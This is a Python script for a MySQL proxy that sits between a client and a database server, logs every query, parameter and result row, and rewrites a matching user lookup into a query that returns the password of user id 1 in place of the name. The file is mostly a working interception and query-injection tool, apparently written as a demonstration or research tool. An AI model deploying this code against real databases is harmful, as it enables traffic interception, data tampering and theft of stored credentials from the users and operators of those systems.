import argparse
import socket
import sys
import threading
from packet import Packet
from utils import *
from flags import *

class Proxy():

    class State():
        def __init__(self):
            self.server_capabilities = 0
            self.client_capabilities = 0
            self.last_query_type = None


    def __init__(self, client, server_host, server_port):
        self.conn_client = client
        self.conn_server = None
        self.state = Proxy.State()
        
        t = threading.Thread(target=self.listen_client,args=[])
        t.start()
        t = threading.Thread(target=self.listen_server,args=[server_host, server_port])
        t.start()


    def listen_client(self):
        
        while True:
            data = self.conn_client.recv(65535)
            if not data:
                break


            p = Packet(data, self.state)
            print(f"C -> S : {p.packet_type}")

            if p.info:
                if p.packet_type == PacketType.PACKET_QUERY or \
                   p.packet_type == PacketType.PACKET_PREPARE_STATEMENT:
                    self.state.last_query_type = p.packet_type
                    
                    query = p.info['query']
                    print(query)

                    if "SELECT id,name FROM users WHERE" in query:
                        new_query = "SELECT id,password as name FROM users WHERE id = 1"
                        data = self.replace_query(new_query)
                        print(f"Caught query : {query}")
                        print(f"Replace with : {new_query}")


                elif p.packet_type == PacketType.PACKET_EXECUTE_STATEMENT:
                    print(p.info['parameters'])

            print()
            self.conn_server.send(data)
            
        self.conn_client.close()


    def listen_server(self, server_host, server_port):

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_host, server_port))
            self.conn_server = s

            while True:
                data = s.recv(65535)
                if not data:
                    break

                p = Packet(data, self.state)
                print(f"C <- S : {p.packet_type}")

                if p.info:
                    if p.packet_type == PacketType.PACKET_TABULAR_RESPONSE:
                        for idx in range(len(p.info['result'])):
                            print(p.info['result'][idx])
                    
                    elif p.packet_type == PacketType.PACKET_ERR:
                        print(p.info)

                print()
                self.conn_client.send(data)


    def replace_query(self, new_query):
        new_query = new_query.encode()
        query_length = len(new_query) + 1
        query_length = query_length.to_bytes(3, 'little')
        return query_length + b"\x00\x16" + new_query


def main_loop(server_host, server_port, listening_port):

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #Avoid "Address already in use" in dev
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1) 

    server.bind(('0.0.0.0', listening_port))
    server.listen(1)

    while True:
        client, client_address = server.accept()
        p = Proxy(client, server_host, server_port)


parser = argparse.ArgumentParser(description='MySQL proxy')
parser.add_argument('-l', '--listening_port', metavar='', type=int, required=False, default=3306, help='Listening port waiting for clients')
parser.add_argument('-s', '--server_host', metavar='', required=False, default='127.0.0.1', help='MySQL server IP or hostname')
parser.add_argument('-p', '--server_port', metavar='', type=int, required=False, default=3307, help='MySQL server port')
args = parser.parse_args()

main_loop(args.server_host, args.server_port, args.listening_port)

